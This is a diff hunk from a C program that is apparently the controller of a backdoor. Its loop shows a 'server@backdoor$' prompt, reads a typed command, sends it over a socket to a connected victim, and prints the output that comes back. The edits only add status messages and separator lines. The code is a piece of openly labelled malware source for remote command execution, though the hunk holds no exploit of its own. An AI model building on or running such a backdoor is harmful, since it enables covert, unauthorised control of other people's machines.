@@ -39,23 +39,27 @@ int main(int argc, char*argv[])
 	memset(buffer,0,sizeof(buffer));
 
 	while(1){
+
 		printf("\nserver@backdoor$\\:");
 		fgets(buffer,20,stdin);
 		send(fdc,buffer,sizeof(buffer),0);
+
 		printf("sent!\n");
-		printf("wait...\n\n");
+		printf("receiving...\n\n");
 		memset(buffer,0,sizeof(buffer));
 		recv(fdc,buffer,sizeof(buffer),0);
-
+		printf("received...\n\n");
 		int a=0;
 
+		printf("--------------------------------------\n",buffer[a]);
 		while(a<sizeof(buffer)){
 			if(buffer[a] == -1)
 				break;
 			printf("%c",buffer[a]);
 			a++;
-
 		}
+		printf("--------------------------------------\n",buffer[a]);
+
 		memset(buffer,0,sizeof(buffer));
 	}
 
